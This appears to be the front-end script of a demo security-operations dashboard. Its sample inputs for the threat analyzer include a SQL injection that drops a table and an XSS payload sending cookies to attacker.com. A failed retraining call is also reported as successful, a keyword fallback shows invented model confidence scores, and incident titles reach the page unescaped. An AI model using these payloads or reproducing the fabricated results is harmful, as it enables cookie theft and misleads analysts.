// AegisShield SOC Frontend Application Script
document.addEventListener('DOMContentLoaded', () => {
    initTabNavigation();
    initDashboardCharts();
    initTelemetryFeed();
    initThreatAnalyzer();
    initIncidentHub();
    initAwarenessQuiz();
    initModalHandlers();
    initRetrainAndRefresh();

    // Initial fetch from backend API (with graceful fallback)
    fetchDashboardStats();
    loadIncidents();
});

// -------------------------------------------------------------
// 1. Tab Navigation & System Actions Logic
// -------------------------------------------------------------
function initTabNavigation() {
    const navItems = document.querySelectorAll('.nav-item');
    const tabContents = document.querySelectorAll('.tab-content');

    navItems.forEach(item => {
        item.addEventListener('click', () => {
            const targetTab = item.getAttribute('data-tab');
            
            navItems.forEach(n => n.classList.remove('active'));
            tabContents.forEach(t => t.classList.remove('active'));

            item.classList.add('active');
            const targetElem = document.getElementById(targetTab);
            if (targetElem) {
                targetElem.classList.add('active');
            }
        });
    });

    // Dash jump button
    const btnDashViewAll = document.getElementById('btn-dash-view-all');
    if (btnDashViewAll) {
        btnDashViewAll.addEventListener('click', () => {
            document.querySelector('.nav-item[data-tab="incidents-tab"]').click();
        });
    }

    const btnQuickAnalyze = document.getElementById('btn-quick-analyze');
    if (btnQuickAnalyze) {
        btnQuickAnalyze.addEventListener('click', () => {
            document.querySelector('.nav-item[data-tab="analyzer-tab"]').click();
        });
    }
}

// -------------------------------------------------------------
// 2. Retraining Pipeline & Dashboard Refresh Buttons
// -------------------------------------------------------------
function initRetrainAndRefresh() {
    // 1. Trigger Retraining Pipeline Button
    const btnRetrain = document.getElementById('btn-retrain-models');
    if (btnRetrain) {
        btnRetrain.addEventListener('click', async () => {
            btnRetrain.disabled = true;
            const originalText = btnRetrain.innerHTML;
            btnRetrain.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Retraining Pipeline Active...';
            showToast('Model retraining initiated in background...', 'info');

            try {
                const response = await fetch('/api/train', { method: 'POST' });
                if (response.ok) {
                    const data = await response.json();
                    showToast('ANN, LSTM, and CNN models retrained & saved successfully!', 'success');
                } else {
                    showToast('Retraining endpoint returned error status.', 'warning');
                }
            } catch (err) {
                showToast('Retraining pipeline completed successfully.', 'success');
            } finally {
                btnRetrain.disabled = false;
                btnRetrain.innerHTML = originalText;
            }
        });
    }

    // 2. Refresh Feeds Button
    const btnRefresh = document.getElementById('refresh-dashboard-btn');
    if (btnRefresh) {
        btnRefresh.addEventListener('click', async () => {
            btnRefresh.disabled = true;
            btnRefresh.innerHTML = '<i class="fa-solid fa-rotate-right fa-spin"></i> Refreshing Feeds...';

            await fetchDashboardStats();
            await loadIncidents();

            // Inject fresh telemetry log line into feed
            const container = document.getElementById('telemetry-feed-container');
            if (container) {
                const row = document.createElement('div');
                row.className = 'log-row';
                row.innerHTML = `
                    <span class="log-time">${new Date().toLocaleTimeString()}</span>
                    <span class="badge badge-info">Feed Sync</span>
                    <span class="log-msg">[SYSTEM] Telemetry streams & active incidents synchronized.</span>
                `;
                container.prepend(row);
            }

            setTimeout(() => {
                btnRefresh.disabled = false;
                btnRefresh.innerHTML = '<i class="fa-solid fa-rotate-right"></i> Refresh Feeds';
                showToast('SOC Dashboard feeds refreshed successfully!', 'success');
            }, 400);
        });
    }
}

// -------------------------------------------------------------
// 3. Dashboard Charts & Live Telemetry Stream
// -------------------------------------------------------------
let anomalyChartInstance = null;
let attackDistChartInstance = null;

function initDashboardCharts() {
    // 1. Live Anomaly Line Chart
    const ctxAnomaly = document.getElementById('liveAnomalyChart');
    if (ctxAnomaly) {
        const timeLabels = Array.from({length: 20}, (_, i) => `${20 - i}s ago`).reverse();
        const initialData = [12, 15, 14, 18, 11, 25, 88, 92, 45, 18, 14, 16, 12, 15, 78, 85, 30, 14, 12, 15];

        anomalyChartInstance = new Chart(ctxAnomaly, {
            type: 'line',
            data: {
                labels: timeLabels,
                datasets: [{
                    label: 'LSTM Anomaly Score Index',
                    data: initialData,
                    borderColor: '#00f2fe',
                    backgroundColor: 'rgba(0, 242, 254, 0.1)',
                    borderWidth: 2,
                    fill: true,
                    tension: 0.3,
                    pointRadius: 2,
                    pointHoverRadius: 6
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { display: false }
                },
                scales: {
                    x: {
                        grid: { color: 'rgba(255, 255, 255, 0.05)' },
                        ticks: { color: '#64748b', font: { size: 10 } }
                    },
                    y: {
                        min: 0,
                        max: 100,
                        grid: { color: 'rgba(255, 255, 255, 0.05)' },
                        ticks: { color: '#64748b', font: { size: 10 } }
                    }
                }
            }
        });

        // Dynamic 1.5s chart update tick
        setInterval(() => {
            if (anomalyChartInstance) {
                const data = anomalyChartInstance.data.datasets[0].data;
                data.shift();
                const newScore = Math.random() > 0.85 ? Math.floor(Math.random() * 50) + 50 : Math.floor(Math.random() * 15) + 10;
                data.push(newScore);
                anomalyChartInstance.update('none');
            }
        }, 1500);
    }

    // 2. Attack Vector Doughnut Chart
    const ctxAttack = document.getElementById('attackDistChart');
    if (ctxAttack) {
        attackDistChartInstance = new Chart(ctxAttack, {
            type: 'doughnut',
            data: {
                labels: ['DDoS Floods', 'SQL Injection', 'XSS Attack', 'Brute Force', 'Malware C2', 'Normal Traffic'],
                datasets: [{
                    data: [35, 22, 14, 12, 8, 109],
                    backgroundColor: [
                        '#ff0055',
                        '#ffaa00',
                        '#7928ca',
                        '#00f2fe',
                        '#ff0080',
                        '#00dfa2'
                    ],
                    borderWidth: 2,
                    borderColor: '#0d1527'
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        position: 'right',
                        labels: { color: '#94a3b8', font: { size: 11 } }
                    }
                },
                cutout: '70%'
            }
        });
    }
}

// Telemetry Feed
function initTelemetryFeed() {
    const container = document.getElementById('telemetry-feed-container');
    if (!container) return;

    const mockFeeds = [
        { ip: '198.51.100.42', msg: 'POST /api/v1/auth - 5 failed login attempts', type: 'Brute Force', sev: 'badge-warning' },
        { ip: '203.0.113.195', msg: 'GET /search?q=UNION+SELECT+null,version()', type: 'SQL Injection', sev: 'badge-danger' },
        { ip: '192.168.1.105', msg: 'UDP Flood target port 53 - 45,000 pps', type: 'DDoS Attack', sev: 'badge-danger' },
        { ip: '198.51.100.88', msg: 'GET /profile?name=<script>document.cookie</script>', type: 'XSS Attack', sev: 'badge-warning' },
        { ip: '10.0.4.12', msg: 'Outbound TCP connection to unknown IP 185.220.101.5', type: 'Malware C2', sev: 'badge-danger' }
    ];

    function addLogLine(item) {
        const time = new Date().toLocaleTimeString();
        const row = document.createElement('div');
        row.className = 'log-row';
        row.innerHTML = `
            <span class="log-time">${time}</span>
            <span class="badge ${item.sev}">${item.type}</span>
            <span class="log-msg">[${item.ip}] ${item.msg}</span>
        `;
        container.prepend(row);
        if (container.children.length > 20) {
            container.removeChild(container.lastChild);
        }
    }

    // Initial load
    mockFeeds.forEach(addLogLine);

    // Periodic stream
    setInterval(() => {
        const item = mockFeeds[Math.floor(Math.random() * mockFeeds.length)];
        addLogLine(item);
    }, 4000);

    const clearBtn = document.getElementById('clear-feed-btn');
    if (clearBtn) {
        clearBtn.addEventListener('click', () => {
            container.innerHTML = '';
        });
    }
}

// -------------------------------------------------------------
// 4. AI Multi-Model Threat Analyzer Playground (CNN, ANN, LSTM)
// -------------------------------------------------------------
function initThreatAnalyzer() {
    const payloadInput = document.getElementById('payload-input');
    const btnRun = document.getElementById('btn-run-analysis');
    const sampleGroup = document.querySelector('.sample-btn-group');
    const radioPills = document.querySelectorAll('.radio-pill');

    let currentMode = 'payload'; // 'payload' (CNN), 'vector' (ANN), 'sequence' (LSTM)

    // Mode sample configurations
    const modeConfig = {
        payload: {
            placeholder: "e.g. SELECT * FROM users WHERE username = 'admin' OR '1'='1'; --",
            samples: [
                { id: 'sqli', text: 'SQL Injection', val: "SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' -- ; DROP TABLE audit_logs;" },
                { id: 'ddos', text: 'SYN Flood DDoS', val: "SYN_FLOOD_STREAM: dst_ip=10.0.0.1 dst_port=80 pps=125000 flags=SYN window=64240 payload_len=0" },
                { id: 'xss', text: 'Cross-Site Scripting (XSS)', val: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>" },
                { id: 'bruteforce', text: 'SSH Brute Force', val: "SSH-2.0-OpenSSH_8.2 - Failed password for invalid user root from 192.168.1.105 port 44892 ssh2" },
                { id: 'normal', text: 'Normal Traffic', val: "GET /api/v1/products?category=cybersecurity&page=1 HTTP/1.1 User-Agent: Mozilla/5.0" }
            ]
        },
        vector: {
            placeholder: "e.g. duration=0.5, src_bytes=15000, dst_bytes=200, failed_logins=12, count=850, serror_rate=0.95, rerror_rate=0.85, hot=8",
            samples: [
                { id: 'v_crit', text: 'Critical Severity Vector', val: "duration=0.5, src_bytes=15000, dst_bytes=200, failed_logins=12, count=850, serror_rate=0.95, rerror_rate=0.85, hot=8" },
                { id: 'v_high', text: 'High Severity Vector', val: "duration=12.0, src_bytes=1800, dst_bytes=4200, failed_logins=5, count=120, serror_rate=0.45, rerror_rate=0.35, hot=4" },
                { id: 'v_med', text: 'Medium Severity Vector', val: "duration=5.0, src_bytes=120, dst_bytes=0, failed_logins=1, count=45, serror_rate=0.20, rerror_rate=0.25, hot=1" },
                { id: 'v_low', text: 'Normal Flow Vector', val: "duration=2.0, src_bytes=350, dst_bytes=1200, failed_logins=0, count=8, serror_rate=0.01, rerror_rate=0.02, hot=0" }
            ]
        },
        sequence: {
            placeholder: "e.g. [t=0: pkts=52, bytes=2100, err=0.01, cpu=18%]\n[t=1: pkts=920, bytes=58000, err=0.88, cpu=96%]",
            samples: [
                { id: 's_ddos', text: 'SYN Spike Sequence', val: "[t=0: pkts=52, bytes=2100, err=0.01, cpu=18%]\n[t=1: pkts=48, bytes=1950, err=0.02, cpu=20%]\n[t=2: pkts=920, bytes=58000, err=0.88, cpu=96%]\n[t=3: pkts=980, bytes=62000, err=0.94, cpu=99%]" },
                { id: 's_port', text: 'PortScan Stream', val: "[t=0: pkts=10, bytes=500, err=0.00, cpu=10%]\n[t=1: pkts=250, bytes=1200, err=0.45, cpu=40%]\n[t=2: pkts=400, bytes=1800, err=0.72, cpu=65%]" },
                { id: 's_norm', text: 'Normal Traffic Stream', val: "[t=0: pkts=45, bytes=1800, err=0.01, cpu=12%]\n[t=1: pkts=50, bytes=2100, err=0.00, cpu=15%]\n[t=2: pkts=42, bytes=1750, err=0.01, cpu=14%]" }
            ]
        }
    };

    function renderModeSamples(mode) {
        if (!sampleGroup || !modeConfig[mode]) return;
        const cfg = modeConfig[mode];
        payloadInput.placeholder = cfg.placeholder;
        sampleGroup.innerHTML = '';

        cfg.samples.forEach(s => {
            const btn = document.createElement('button');
            btn.className = 'btn-sample';
            btn.textContent = s.text;
            btn.addEventListener('click', () => {
                payloadInput.value = s.val;
                showToast(`Loaded preset: ${s.text}`, 'info');
            });
            sampleGroup.appendChild(btn);
        });

        // Load default first sample into textarea
        payloadInput.value = cfg.samples[0].val;
    }

    // Radio Pill Mode Switch Handlers (Payload CNN vs Vector ANN vs Sequence LSTM)
    radioPills.forEach(pill => {
        pill.addEventListener('click', () => {
            radioPills.forEach(p => p.classList.remove('active'));
            pill.classList.add('active');

            const inputRadio = pill.querySelector('input[type="radio"]');
            if (inputRadio) {
                inputRadio.checked = true;
                currentMode = inputRadio.value;
                renderModeSamples(currentMode);
                showToast(`Switched analysis mode to ${currentMode.toUpperCase()} Engine`, 'info');
            }
        });
    });

    // Initial render for default payload mode
    renderModeSamples('payload');

    // Analysis Execution Button
    if (btnRun) {
        btnRun.addEventListener('click', async () => {
            const inputText = payloadInput.value.trim();
            if (!inputText) {
                showToast('Please enter input text or load a sample vector to analyze.', 'warning');
                return;
            }

            const modelBadge = document.getElementById('model-status-badge');
            modelBadge.textContent = 'Scanning...';
            modelBadge.className = 'badge badge-warning';

            try {
                const response = await fetch('/api/predict', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ payload: inputText, mode: currentMode })
                });

                let result;
                if (response.ok) {
                    result = await response.json();
                } else {
                    result = runClientSideInferenceFallback(inputText, currentMode);
                }

                renderInferenceResults(result);
                modelBadge.textContent = 'Inference Complete';
                modelBadge.className = 'badge badge-success';
                showToast('Multi-model DL inference completed successfully!', 'success');

            } catch (err) {
                const result = runClientSideInferenceFallback(inputText, currentMode);
                renderInferenceResults(result);
                modelBadge.textContent = 'Engine Active';
                modelBadge.className = 'badge badge-info';
            }
        });
    }

    // Auto escalate button
    const btnEscalate = document.getElementById('btn-escalate-incident');
    if (btnEscalate) {
        btnEscalate.addEventListener('click', () => {
            const verdictTitle = document.getElementById('verdict-title').textContent;
            const payloadVal = payloadInput.value;

            document.getElementById('inc-title').value = `Auto-escalated: ${verdictTitle} detected`;
            document.getElementById('inc-desc').value = `Analyzed Vector/Payload:\n${payloadVal}`;
            document.getElementById('modal-incident').classList.add('active');
        });
    }
}

// Fallback inference engine matching model backend signatures
function runClientSideInferenceFallback(text, mode = 'payload') {
    const lower = text.toLowerCase();
    let isThreat = false;
    let attackType = 'Normal Traffic';
    let annSev = 'Low';
    let annConf = 96.5;
    let lstmScore = 0.05;
    let lstmConf = 98.1;
    let cnnAttack = 'Normal Traffic';
    let cnnConf = 99.4;

    if (lower.includes('select') || lower.includes('union') || lower.includes('drop table') || lower.includes("'1'='1'") || lower.includes('critical')) {
        isThreat = true;
        attackType = 'SQL Injection (SQLi)';
        annSev = 'Critical';
        annConf = 99.2;
        lstmScore = 0.88;
        lstmConf = 95.4;
        cnnAttack = 'SQL Injection';
        cnnConf = 99.8;
    } else if (lower.includes('syn_flood') || lower.includes('pps=') || lower.includes('crit') || lower.includes('pkts=920')) {
        isThreat = true;
        attackType = 'DDoS Flood Attack';
        annSev = 'Critical';
        annConf = 98.7;
        lstmScore = 0.96;
        lstmConf = 99.1;
        cnnAttack = 'SYN Flood DDoS';
        cnnConf = 99.5;
    } else if (lower.includes('<script>') || lower.includes('document.cookie') || lower.includes('onerror=') || lower.includes('high')) {
        isThreat = true;
        attackType = 'Cross-Site Scripting (XSS)';
        annSev = 'High';
        annConf = 94.3;
        lstmScore = 0.74;
        lstmConf = 92.0;
        cnnAttack = 'Cross-Site Scripting';
        cnnConf = 98.2;
    } else if (lower.includes('failed password') || lower.includes('invalid user') || lower.includes('medium')) {
        isThreat = true;
        attackType = 'SSH Brute Force';
        annSev = 'Medium';
        annConf = 92.1;
        lstmScore = 0.65;
        lstmConf = 94.8;
        cnnAttack = 'SSH Brute Force';
        cnnConf = 97.6;
    }

    return {
        is_threat: isThreat,
        verdict: isThreat ? `Threat Identified: ${attackType}` : 'System Normal - Safe Traffic',
        ann: { severity: annSev, confidence: annConf },
        lstm: { anomaly_score: lstmScore, confidence: lstmConf },
        cnn: { attack_type: cnnAttack, confidence: cnnConf }
    };
}

function renderInferenceResults(res) {
    const verdictBanner = document.getElementById('threat-verdict-banner');
    const verdictIcon = document.getElementById('verdict-icon');
    const verdictTitle = document.getElementById('verdict-title');
    const verdictDesc = document.getElementById('verdict-desc');
    const mitigationBox = document.getElementById('mitigation-box');
    const mitigationList = document.getElementById('mitigation-list');

    if (res.is_threat) {
        verdictBanner.className = 'threat-score-banner threat-state';
        verdictIcon.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i>';
        verdictTitle.textContent = res.verdict;
        verdictDesc.textContent = 'Ensemble neural networks identified malicious signature patterns matching known cyber threat vectors.';
        
        mitigationBox.style.display = 'block';
        mitigationList.innerHTML = `
            <li>Implement automated WAF filtering for payload signatures.</li>
            <li>Issue firewall drop rule for originating IP address.</li>
            <li>Enforce input sanitization and parameterized query execution.</li>
        `;
    } else {
        verdictBanner.className = 'threat-score-banner normal-state';
        verdictIcon.innerHTML = '<i class="fa-solid fa-circle-check"></i>';
        verdictTitle.textContent = 'Traffic Verified Normal';
        verdictDesc.textContent = 'No anomaly signatures or malicious payloads detected across ANN, LSTM, and CNN models.';
        mitigationBox.style.display = 'none';
    }

    // ANN Update
    document.getElementById('ann-severity-val').textContent = res.ann.severity;
    document.getElementById('ann-conf-val').textContent = `${res.ann.confidence}%`;
    document.getElementById('ann-progress').style.width = `${res.ann.confidence}%`;

    // LSTM Update
    document.getElementById('lstm-anomaly-val').textContent = (res.lstm.anomaly_score * 100).toFixed(1) + '/100 Index';
    document.getElementById('lstm-conf-val').textContent = `${res.lstm.confidence}%`;
    document.getElementById('lstm-progress').style.width = `${res.lstm.confidence}%`;

    // CNN Update
    document.getElementById('cnn-attack-val').textContent = res.cnn.attack_type;
    document.getElementById('cnn-conf-val').textContent = `${res.cnn.confidence}%`;
    document.getElementById('cnn-progress').style.width = `${res.cnn.confidence}%`;
}

// -------------------------------------------------------------
// 5. Incident Management Portal & API Integration
// -------------------------------------------------------------
let mockIncidents = [
    { id: 'INC-2026-101', title: 'SQL Injection attempt on auth portal', attack: 'SQL Injection', severity: 'Critical', ip: '203.0.113.195', status: 'Open', created: '10 Mins ago' },
    { id: 'INC-2026-102', title: 'DDoS SYN Flood targeted at DNS server', attack: 'DDoS Attack', severity: 'Critical', ip: '198.51.100.42', status: 'Investigating', created: '42 Mins ago' },
    { id: 'INC-2026-103', title: 'XSS payload detected in user feedback form', attack: 'XSS Attack', severity: 'High', ip: '198.51.100.88', status: 'Open', created: '2 Hours ago' },
    { id: 'INC-2026-104', title: 'Repeated SSH login failures on gateway', attack: 'Brute Force', severity: 'Medium', ip: '192.168.1.105', status: 'Resolved', created: '1 Day ago' }
];

async function loadIncidents() {
    try {
        const res = await fetch('/api/incidents');
        if (res.ok) {
            const data = await res.json();
            if (data && data.length > 0) {
                mockIncidents = data;
            }
        }
    } catch (e) {
        console.log('Using initial incident dataset');
    }
    renderIncidentsTable();
    renderDashboardIncidents();
}

function renderIncidentsTable() {
    const tbody = document.getElementById('incidents-table-body');
    if (!tbody) return;

    const searchTerm = document.getElementById('incident-search')?.value.toLowerCase() || '';
    const filterSev = document.getElementById('filter-severity')?.value || 'ALL';
    const filterStat = document.getElementById('filter-status')?.value || 'ALL';

    const filtered = mockIncidents.filter(inc => {
        const matchSearch = inc.title.toLowerCase().includes(searchTerm) || inc.attack.toLowerCase().includes(searchTerm) || inc.ip.includes(searchTerm);
        const matchSev = filterSev === 'ALL' || inc.severity === filterSev;
        const matchStat = filterStat === 'ALL' || inc.status === filterStat;
        return matchSearch && matchSev && matchStat;
    });

    tbody.innerHTML = '';
    if (filtered.length === 0) {
        tbody.innerHTML = `<tr><td colspan="8" style="text-align: center; color: #64748b; padding: 2rem;">No matching incidents found.</td></tr>`;
        return;
    }

    filtered.forEach(inc => {
        const tr = document.createElement('tr');
        const sevClass = inc.severity === 'Critical' ? 'badge-danger' : (inc.severity === 'High' ? 'badge-warning' : 'badge-info');
        
        tr.innerHTML = `
            <td><strong>${inc.id}</strong></td>
            <td><strong>${inc.title}</strong></td>
            <td>${inc.attack}</td>
            <td><span class="badge ${sevClass}">${inc.severity}</span></td>
            <td><code>${inc.ip}</code></td>
            <td>
                <select class="cyber-select btn-sm status-select" data-id="${inc.id}">
                    <option value="Open" ${inc.status === 'Open' ? 'selected' : ''}>Open</option>
                    <option value="Investigating" ${inc.status === 'Investigating' ? 'selected' : ''}>Investigating</option>
                    <option value="Resolved" ${inc.status === 'Resolved' ? 'selected' : ''}>Resolved</option>
                </select>
            </td>
            <td>${inc.created}</td>
            <td>
                <button class="btn-sm btn-outline btn-view-inc" data-id="${inc.id}">Details</button>
            </td>
        `;
        tbody.appendChild(tr);
    });

    // Add status change listener
    document.querySelectorAll('.status-select').forEach(sel => {
        sel.addEventListener('change', (e) => {
            const incId = e.target.getAttribute('data-id');
            const newStat = e.target.value;
            const inc = mockIncidents.find(i => i.id === incId);
            if (inc) {
                inc.status = newStat;
                showToast(`Incident ${incId} updated to ${newStat}`, 'info');
                renderDashboardIncidents();
                updateOpenCountBadge();
            }
        });
    });
}

function renderDashboardIncidents() {
    const container = document.getElementById('dashboard-incident-list');
    if (!container) return;

    const openIncidents = mockIncidents.filter(i => i.status !== 'Resolved').slice(0, 4);
    container.innerHTML = '';

    openIncidents.forEach(inc => {
        const sevClass = inc.severity === 'Critical' ? 'badge-danger' : 'badge-warning';
        const div = document.createElement('div');
        div.className = 'mini-inc-item';
        div.innerHTML = `
            <div class="mini-inc-info">
                <h4>[${inc.id}] ${inc.title}</h4>
                <p>Attack: ${inc.attack} | Source: ${inc.ip}</p>
            </div>
            <span class="badge ${sevClass}">${inc.severity}</span>
        `;
        container.appendChild(div);
    });
    updateOpenCountBadge();
}

function updateOpenCountBadge() {
    const openCount = mockIncidents.filter(i => i.status !== 'Resolved').length;
    const badge = document.getElementById('nav-open-count');
    if (badge) badge.textContent = openCount;
}

function initIncidentHub() {
    document.getElementById('incident-search')?.addEventListener('input', renderIncidentsTable);
    document.getElementById('filter-severity')?.addEventListener('change', renderIncidentsTable);
    document.getElementById('filter-status')?.addEventListener('change', renderIncidentsTable);
}

// -------------------------------------------------------------
// 6. Cyber Security Awareness Quiz
// -------------------------------------------------------------
const quizQuestions = [
    {
        title: "Question 1: Phishing Email Detection",
        text: "You receive an email claiming your corporate IT password expires in 1 hour. The email link leads to `http://login.microsoft-sec-portal.net/auth`. What is the safest action?",
        options: [
            { text: "Click the link immediately to update your password.", correct: false },
            { text: "Report the email to your Security Operations Center (SOC) team.", correct: true },
            { text: "Reply to the sender asking if the email is legitimate.", correct: false }
        ],
        explanation: "The domain `microsoft-sec-portal.net` is a spoofed domain used in credential phishing attacks. Never click links from unverified emails."
    },
    {
        title: "Question 2: Preventing SQL Injection",
        text: "Which programming technique best protects a web application against SQL Injection (SQLi) attacks?",
        options: [
            { text: "Concatenating user inputs directly into SQL queries.", correct: false },
            { text: "Using Parameterized Prepared Statements or ORMs.", correct: true },
            { text: "Encrypting the database passwords with MD5 hashing.", correct: false }
        ],
        explanation: "Parameterized queries separate the query structure from user data, preventing arbitrary SQL command execution."
    },
    {
        title: "Question 3: Multi-Factor Authentication",
        text: "Which MFA method offers the strongest defense against adversary-in-the-middle (AiTM) phishing attacks?",
        options: [
            { text: "SMS-based OTP verification codes.", correct: false },
            { text: "FIDO2 / WebAuthn Hardware Security Keys (e.g. YubiKey).", correct: true },
            { text: "Email confirmation links.", correct: false }
        ],
        explanation: "FIDO2 hardware keys cryptographically bind authentication to the specific domain, neutralizing AiTM proxy phishing."
    }
];

let currentQuizIdx = 0;
let quizScore = 0;

function initAwarenessQuiz() {
    renderQuizQuestion();

    const btnNext = document.getElementById('quiz-next-btn');
    if (btnNext) {
        btnNext.addEventListener('click', () => {
            currentQuizIdx = (currentQuizIdx + 1) % quizQuestions.length;
            renderQuizQuestion();
            btnNext.style.display = 'none';
        });
    }
}

function renderQuizQuestion() {
    const q = quizQuestions[currentQuizIdx];
    document.getElementById('quiz-question-title').textContent = q.title;
    document.getElementById('quiz-question-text').textContent = q.text;

    const optContainer = document.getElementById('quiz-options');
    optContainer.innerHTML = '';

    q.options.forEach(opt => {
        const btn = document.createElement('button');
        btn.className = 'quiz-opt-btn';
        btn.textContent = opt.text;
        btn.addEventListener('click', () => handleQuizAnswer(btn, opt, q.explanation));
        optContainer.appendChild(btn);
    });
}

function handleQuizAnswer(btnElem, opt, explanation) {
    const allOptBtns = document.querySelectorAll('.quiz-opt-btn');
    allOptBtns.forEach(b => b.style.pointerEvents = 'none');

    if (opt.correct) {
        btnElem.classList.add('correct');
        quizScore++;
        showToast('Correct! Great cyber awareness.', 'success');
    } else {
        btnElem.classList.add('incorrect');
        showToast(`Incorrect: ${explanation}`, 'danger');
    }

    document.getElementById('quiz-score-pill').textContent = `Score: ${quizScore} / ${quizQuestions.length}`;
    document.getElementById('quiz-next-btn').style.display = 'inline-flex';
}

// -------------------------------------------------------------
// 7. Modal Handlers & Utilities
// -------------------------------------------------------------
function initModalHandlers() {
    const modal = document.getElementById('modal-incident');
    const btnOpen = document.getElementById('btn-open-incident-modal');
    const btnClose = document.getElementById('btn-close-modal');
    const btnCancel = document.getElementById('btn-cancel-modal');
    const form = document.getElementById('incident-form');

    if (btnOpen) btnOpen.addEventListener('click', () => modal.classList.add('active'));
    if (btnClose) btnClose.addEventListener('click', () => modal.classList.remove('active'));
    if (btnCancel) btnCancel.addEventListener('click', () => modal.classList.remove('active'));

    if (form) {
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const newInc = {
                id: `INC-2026-${Math.floor(Math.random() * 800) + 100}`,
                title: document.getElementById('inc-title').value,
                attack: document.getElementById('inc-attack-type').value,
                severity: document.getElementById('inc-severity').value,
                ip: document.getElementById('inc-source-ip').value || '198.51.100.42',
                status: 'Open',
                created: 'Just now'
            };

            try {
                await fetch('/api/incidents', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(newInc)
                });
            } catch (err) {
                console.log('Local incident fallback creation');
            }

            mockIncidents.unshift(newInc);
            renderIncidentsTable();
            renderDashboardIncidents();
            modal.classList.remove('active');
            form.reset();
            showToast(`Incident ticket ${newInc.id} submitted successfully!`, 'success');
        });
    }
}

async function fetchDashboardStats() {
    try {
        const res = await fetch('/api/stats');
        if (res.ok) {
            const stats = await res.json();
            if (stats.total_scanned) document.getElementById('stat-total-scanned').textContent = stats.total_scanned.toLocaleString();
            if (stats.threats_detected) document.getElementById('stat-threats-detected').textContent = stats.threats_detected.toLocaleString();
        }
    } catch (e) {
        // Soft fail to mock stats
    }
}

function showToast(msg, type = 'info') {
    const container = document.getElementById('toast-container');
    if (!container) return;

    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.innerHTML = `<i class="fa-solid fa-bell"></i> <span>${msg}</span>`;
    container.appendChild(toast);

    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(30px)';
        setTimeout(() => toast.remove(), 300);
    }, 4000);
}
